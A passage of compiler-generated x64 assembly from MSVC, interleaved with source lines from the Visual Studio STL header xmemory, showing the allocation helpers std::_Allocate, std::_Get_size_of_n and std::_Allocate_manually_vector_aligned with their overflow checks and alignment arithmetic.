; 90   :         return ::operator new(_Bytes);

  00040	e9 00 00 00 00	 jmp	 ??2@YAPEAX_K@Z		; operator new
$LN3@Allocate:

; 248  :         return _Traits::_Allocate(_Bytes);
; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00045	33 c0		 xor	 eax, eax

; 252  : }

  00047	48 83 c4 28	 add	 rsp, 40			; 00000028H
  0004b	c3		 ret	 0
$LN23@Allocate:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0004c	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00051	cc		 int	 3
$LN11@Allocate:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00052	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00057	cc		 int	 3
$LN21@Allocate:
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Count$ = 48
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN7:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;
; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 73   :         if (_Count > _Max_possible) {

  00004	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0000e	48 3b c8	 cmp	 rcx, rax
  00011	77 09		 ja	 SHORT $LN6@Get_size_o

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00013	48 8d 04 09	 lea	 rax, QWORD PTR [rcx+rcx]

; 79   : }

  00017	48 83 c4 28	 add	 rsp, 40			; 00000028H
  0001b	c3		 ret	 0
$LN6@Get_size_o:

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  0001c	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00021	cc		 int	 3
$LN4@Get_size_o:
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 48
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN17:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00004	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00008	48 3b c1	 cmp	 rax, rcx
  0000b	76 27		 jbe	 SHORT $LN16@Allocate_m

; 90   :         return ::operator new(_Bytes);

  0000d	48 8b c8	 mov	 rcx, rax
  00010	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00015	48 8b c8	 mov	 rcx, rax

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00018	48 85 c0	 test	 rax, rax
  0001b	74 11		 je	 SHORT $LN7@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  0001d	48 83 c0 27	 add	 rax, 39			; 00000027H
  00021	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00025	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;
; 156  : }

  00029	48 83 c4 28	 add	 rsp, 40			; 00000028H
  0002d	c3		 ret	 0
$LN7@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0002e	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00033	cc		 int	 3
$LN16@Allocate_m:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00034	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00039	cc		 int	 3
$LN14@Allocate_m:
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
END
